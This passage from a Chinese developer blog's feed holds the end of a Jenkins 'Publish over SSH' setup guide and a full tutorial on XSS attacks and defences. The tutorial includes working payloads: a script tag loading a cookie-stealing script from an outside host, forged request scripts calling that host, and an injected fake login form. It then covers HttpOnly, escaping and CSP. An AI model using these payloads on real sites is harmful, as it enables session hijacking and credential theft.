使用该命令测试</span></span><br><span class="line">ssh root@B服务器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 登录后注意此时主机名已经是 B 服务器的了 查看命令</span></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改主机名 centos6</span></span><br><span class="line">vim /etc/sysconfig/network  #编辑network文件修改hostname行（重启生效）</span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查修改</span></span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改主机名 centos7</span></span><br><span class="line">hostnamectl set-hostname www.iyouhun.com # 使用这个命令会立即生效且重启也生效</span><br></pre></td></tr></table></figure><p>复制后的文件在 <code>home/用户名/.ssh/</code>文件下名为 <code>authorized_keys</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 比如 新建了一个 Jenkins账户</span></span><br><span class="line">cat /home/jenkins/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> root 账户在</span></span><br><span class="line">cat /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><h3 id="Publish-over-SSH-插件配置"><a href="#Publish-over-SSH-插件配置" class="headerlink" title="Publish over SSH 插件配置"></a>Publish over SSH 插件配置</h3><p><strong>Passphrase</strong>：  如果生成秘钥的时候输入了密码，就在这里输入，否则留空</p><p><strong>Path to Key</strong>： Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路径，和下面的<strong>Key</strong>二选一</p><p><strong>Key</strong>：  Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路内容，和上面的<strong>Path to Key</strong>二选一</p><p><strong>Disable exec</strong>： 禁用命令执行，删除从此插件执行命令的能力</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-152627@2x.png" alt=""></p><h4 id="SSH-Servers"><a href="#SSH-Servers" class="headerlink" title="SSH Servers"></a>SSH Servers</h4><p><strong>Name</strong>：  名称，标识，自定义即可，仅用作识别</p><p><strong>Host name</strong>： 主机名，服务器的主机名或 IP 地址，这里填写B服务器的 IP地址</p><p><strong>Username</strong>：  将用于连接到主机的用户，比如 <code>root</code></p><p><strong>Remote directory</strong>： 远程服务器上的一个目录，将用作此配置的有效根目录，比如<code>/www/wwwroot</code></p><p><strong>高级选项</strong></p><p>Use password authentication, or use a different key 可以勾选使用密码连接或者秘钥连接</p><p><strong>Passphrase / Password</strong>：秘钥密码或者用户名密码</p><p><strong>Path to Key</strong>： Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路径，和下面的<strong>Key</strong>二选一 </p><p><strong>Key</strong>：  Jenkins 所在服务器秘钥(<code>id_rsa</code>)的路内容，和上面的<strong>Path to Key</strong>二选一</p><p><strong>如果用秘钥链接记住这里是Jenkins(A 服务器)的私钥(<code>id_rsa</code>)</strong></p><p><strong>Port</strong>：远程服务器端口，如果修改了端口，这里记得也改一下</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-160114@2x.png" alt=""></p><p>更多参考：<a href="https://wiki.jenkins.io/display/JENKINS/Publish+Over#PublishOver-host" target="_blank" rel="noopener">https://wiki.jenkins.io/display/JENKINS/Publish+Over#PublishOver-host</a></p><h4 id="项目发布设置"><a href="#项目发布设置" class="headerlink" title="项目发布设置"></a>项目发布设置</h4><p>1.点击 Jenkins项目的构建环境</p><p>2.根据项目情况选择以下两项</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-162258@2x.png" alt=""></p><p>3.选择刚刚添加的发布服务器</p><p>4.传输设置</p><p><strong>Source files</strong>：源文件，支持全部匹配，如果要传输文件夹内所有文件和文件夹则需要在文件夹路径后加两个*符号 <a href="http://ant.apache.org/manual/dirtasks.html#patterns" target="_blank" rel="noopener">模式文档</a></p><p><strong>Remove prefix</strong>：移除前缀，是指源文件的前缀，比如现在我们只是传输html文件夹里的所有文件，但是html文件夹本身不需要在远程服务器出现，那么就需要将其移除.</p><p><strong>Remote directory</strong>： 远程服务器目录，注意该目录是相对于刚刚系统设置里<code>ssh servers</code>里设置的路径，没有会创建</p><p>那么我的此次的目录就是<code>/www/wwwroot/www.iyouhun.com</code></p><p><strong>exec command</strong>：在传输完成后执行的命令，一般为清理文件、复制文件、重启一些服务等等</p><p><img src="https://oss.iyouhun.com/img/QQ20211108-160529@2x.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;服务器互信&quot;&gt;&lt;a href=&quot;#服务器互信&quot; class=&quot;headerlink&quot; title=&quot;服务器互信&quot;&gt;&lt;/a&gt;服务器互信&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;A服务器：Jenkins 所在服务器&lt;/p&gt;
&lt;p&gt;B 服务器：项目部署所在服务器&lt;/p&gt;
      
    
    </summary>
    
      <category term="工具" scheme="//www.shen.ee/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Jenkins" scheme="//www.shen.ee/tags/Jenkins/"/>
    
      <category term="Publish over SSH" scheme="//www.shen.ee/tags/Publish-over-SSH/"/>
    
      <category term="ssh服务器互信" scheme="//www.shen.ee/tags/ssh%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%92%E4%BF%A1/"/>
    
      <category term="服务器互信" scheme="//www.shen.ee/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%92%E4%BF%A1/"/>
    
      <category term="jenkins上传远程服务器" scheme="//www.shen.ee/tags/jenkins%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
      <category term="jenkins远程服务器配置" scheme="//www.shen.ee/tags/jenkins%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击原理分析与防御</title>
    <link href="//www.shen.ee/article/58122.html"/>
    <id>//www.shen.ee/article/58122.html</id>
    <published>2022-06-17T03:05:39.000Z</published>
    <updated>2022-06-22T06:24:26.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p><strong>XSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶意的脚本，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</strong></p><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./test.php"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">    您的姓名</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> &gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/md/image-20220615171210880.png" alt="image-20220615171210880"></p><p>输入一段脚本代码提交，会直接弹出</p><p><img src="https://oss.iyouhun.com/img/md/image-20220615165247780.png" alt="image-20220615165247780"></p><p>我们看一下源代码，script脚本被加载到页面中，这显然是有问题的.</p><p><img src="https://oss.iyouhun.com/img/md/image-20220615171427021.png" alt="image-20220615171427021"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型xss会把用户输入的数据存储在服务器端，这种xss具备很强的稳定性，常见的场景就是，黑客写下一篇包含恶意js脚本的博客，其他用户浏览包含恶意js脚本的博客，会在他们浏览器上执行这段恶意代码。包含恶意js脚本的博客是保存在服务端的，所以这种xss攻击叫做“存储型xss”</p><p><strong>正常输入</strong></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173719232.png" alt="image-20220615173719232"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173747621.png" alt="image-20220615173747621"></p><p><strong>非人类输入</strong></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173832904.png" alt="image-20220615173832904"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615173849667.png" alt="image-20220615173849667"></p><h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>传统类型的XSS漏洞（反射型或存储型）一般出现在服务器端代码中，而DOM XSS是基于DOM文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).value</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"t"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"' &gt;testLink&lt;/a&gt;"</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击wirte会有一个超链接，其地址为文本框的内容。</p><p>这里的wirte按钮的onclick事件调用了test()函数。而在test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作html写入到页面中，这就造成了DOM based XSS。</p><p>我们构造一个恶意数据：<code>&#39; onclick=&quot;alert(1)&quot;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615175201085.png" alt="image-20220615175201085"></p><p>也可以选择闭合掉标签，并插入一个新的HTML标签</p><p><code>&#39;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#39;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220615175708141.png" alt="image-20220615175708141"></p><h2 id="XSS漏洞利用"><a href="#XSS漏洞利用" class="headerlink" title="XSS漏洞利用"></a>XSS漏洞利用</h2><h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>常见的XSS漏洞利用方式有Cookie劫持，一般Cookie中保存了用户的登录凭证。如果Cookie泄露，则可以直接登录进用户的账号。</p><ul><li>1.用户登录</li><li>2.攻击者欺骗用户访问带XSS payload的URL</li><li>3.用户请求攻击者的URL</li><li>4.在用户浏览器执行远程js，将cookie发送给攻击者</li><li>5.攻击者利用cookie进入用户账号</li></ul><p>我们可以在最初的反射型例子中输入一段包含远程脚本的代码<code>&lt;script src=&quot;https://liuliang.tk/getcookie.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220616102705682.png" alt="image-20220616102705682"></p><p>看下远程服务器响应日志</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616102741200.png" alt="image-20220616102741200"></p><h3 id="构造GET与POST请求"><a href="#构造GET与POST请求" class="headerlink" title="构造GET与POST请求"></a>构造GET与POST请求</h3><p>通过js，让浏览器发起GET、POST请求，完成各种操作。</p><ul><li>构造GET请求：通过插入图片，图片的src为GET请求的URL。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">const</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>)</span><br><span class="line">img.src = <span class="string">'https://liuliang.tk/option.php?option=add'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img)</span><br></pre></td></tr></table></figure><ul><li><p>构造POST请求：</p><ul><li><p>1.构造form表单，并提交</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">const</span> dd = <span class="built_in">document</span>.createElement (<span class="string">"div"</span>)</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(dd)</span><br><span class="line">dd.innerHTML = <span class="string">"&lt;form action='option.php' method='post' id='xssform'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;input type='text' name='option' value='add'&gt; &lt;/form&gt;"</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"xssform"</span>).submit()</span><br></pre></td></tr></table></figure></li><li><p>2.使用 ajax 请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// option.js</span></span><br><span class="line"><span class="keyword">let</span> ajax = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'https://liuliang.tk/option.php'</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXobject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveX0bject (<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">"not compatible"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax.open(<span class="string">"post"</span>, url, <span class="literal">true</span>)</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">ajax.send(<span class="string">'option=add'</span>)</span><br><span class="line"></span><br><span class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.redyState == <span class="number">4</span> &amp;&amp; ajax.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(<span class="string">"Done"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>访问<code>https://liuliang.tk/option.php?xss=&lt;script src=&quot;https://liuliang.tk/option.js&quot;&gt;&lt;/script&gt;</code></p><p><code>option.txt</code>中写入结果</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616115727331.png" alt="image-20220616115727331"></p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>伪装一个页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dd = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>)</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(dd)</span><br><span class="line">dd.innerHTML = <span class="string">"&lt;meta charset='UTF-8'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;form action='login.php' method='post'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;label&gt;用户名:&lt;/label&gt;"</span> + <span class="string">"&lt;input type='text' name='username'&gt;&lt;/li&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;label&gt;密码:&lt;/label&gt;"</span> + <span class="string">"&lt;input type= 'password' name='password'&gt;&lt;/li&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;li&gt;&lt;input type='submit' name='login' value='登录'&gt;&lt;/li&gt;&lt;/form&gt;"</span></span><br></pre></td></tr></table></figure><p>注入 xss <code>https://liuliang.tk/login.php?param=&lt;script src=&quot;https://liuliang.tk/login.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="https://oss.iyouhun.com/img/md/image-20220616135039587.png" alt="image-20220616135039587"></p><p><img src="https://oss.iyouhun.com/img/md/image-20220616135237632.png" alt="image-20220616135237632"></p><h3 id="识别浏览器及插件"><a href="#识别浏览器及插件" class="headerlink" title="识别浏览器及插件"></a>识别浏览器及插件</h3><p>信息收集用户的浏览器版本信息，扩大攻击面。通过js读取浏览器的userAgent对象识别浏览器版本，查询navigator.plugins对象获取插件信息。</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616135613416.png" alt="image-20220616135613416"></p><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p><strong>一个cookie的使用过程如下：</strong></p><p><strong>step1: 浏览器向服务器发起请求，这时候没有cookie。</strong></p><p><strong>step2 : 服务器返回时发送set-cookie，向客户端浏览器写入cookie。</strong></p><p><strong>step3: 在该cookie到前期，浏览器访问该域下的所有界面，都将发送该cookie。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Set-Cookie: Cookie1=test1;&quot;);</span><br><span class="line">    header(&quot;Set-Cookie: Cookie2=test2;httponly&quot;, false);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(document.cookie)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>只有<code>test1</code>被读取到</p><p><img src="https://oss.iyouhun.com/img/md/image-20220616141250020.png" alt="image-20220616141250020"></p><h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>对传入参数进行格式校验，并对特殊字符进行过滤或转义。由于输入数据的使用场景不同，过滤或转义可能会影响实际的业务使用。同时XSS攻击发生的位置并不是参数传入的位置，可能存在遗漏。</p><p>输入检查的代码一定要在服务器端实现，因为如果在客户端使用JavaScript进行输入检查，很容易绕过检查。正常做法是客户端和服务端实现相同的输入检查，客户端可以阻挡大部分错误操作的正常用户，可以节约服务器的资源。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">"&amp;amp;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">"&amp;lt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/"/g</span>, <span class="string">"&amp;quot;"</span>);</span><br><span class="line">    str = str.replace(<span class="regexp">/'/g</span>, <span class="string">"&amp;#39;"</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>对返回给浏览器的输出结果进行HTML实体化编码。对JavaScript输出的用户可控数据进行转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--api.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    @$input = $_GET[&apos;param&apos;];</span><br><span class="line">    echo &quot;&lt;div&gt;.$input.&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div&gt;&quot;.htmlentities($input).&quot;&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div&gt;&quot;.htmlspecialchars($input).&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注：<code>htmlentities</code>不指定编码的话遇到中文会乱码</p><p>在使用 <code>.innerHTML</code>、<code>document.write()</code>、<code>document.outerHTML</code> 这些能够修改页面结构的 API 时要注意防范恶意代码，尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等</p><h3 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a>内容安全策略（CSP）</h3><p><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">内容安全策略（Content Security Policy）</a>，实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。</p><p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-Policy 的字段。</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">script-src</span> <span class="string">'self'</span>; </span><br><span class="line">                         <span class="keyword">object-src</span> <span class="string">'none'</span>;</span><br><span class="line">                         <span class="keyword">style-src</span> cdn.example.org iyouhun.com; </span><br><span class="line">                         <span class="keyword">child-src</span> https:</span><br></pre></td></tr></table></figure><p>另一种是通过网页的 <code>&lt;meta&gt;</code> 标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org iyouhun.com; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><ul><li><strong>脚本：</strong> 只信任当前域名</li><li><strong><code>&lt;object&gt;</code>标签：</strong> 不信任任何 URL，即不加载任何资源</li><li><strong>样式表：</strong> 只信任 cdn.example.org 和 iyouhun.com</li><li><strong>页面子内容，如 <code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>：</strong> 必须使用HTTPS协议加载</li><li><strong>其他资源：</strong> 没有限制</li></ul><p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>百度网盘：<a href="https://zhuanlan.zhihu.com/p/24249045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24249045</a></p><p>酷站：<a href="https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html</a></p><h2 id="xss在线攻击小游戏"><a href="#xss在线攻击小游戏" class="headerlink" title="xss在线攻击小游戏"></a>xss在线攻击小游戏</h2><p><a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p><p><a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></p><p><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">https://xss-game.appspot.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;XSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端安全" scheme="//www.shen.ee/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="xss" scheme="//www.shen.ee/tags/xss/"/>
    
      <category term="xss跨站脚本攻击" scheme="//www.shen.ee/tags/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="xss防御" scheme="//www.shen.ee/tags/xss%E9%98%B2%E5%BE%A1/"/>
    
      <category term="xss原理" scheme="//www.shen.ee/tags/xss%E5%8E%9F%E7%90%86/"/>
    
      <category term="xss攻击" scheme="//www.shen.ee/tags/xss%E6%94%BB%E5%87%BB/"/>
    
      <category term="cookie劫持" scheme="//www.shen.ee/tags/cookie%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>TypeScript 常用类型</title>
    <link href="//www.shen.ee/article/32125.html"/>
    <id>//www.shen.ee/article/32125.html</id>
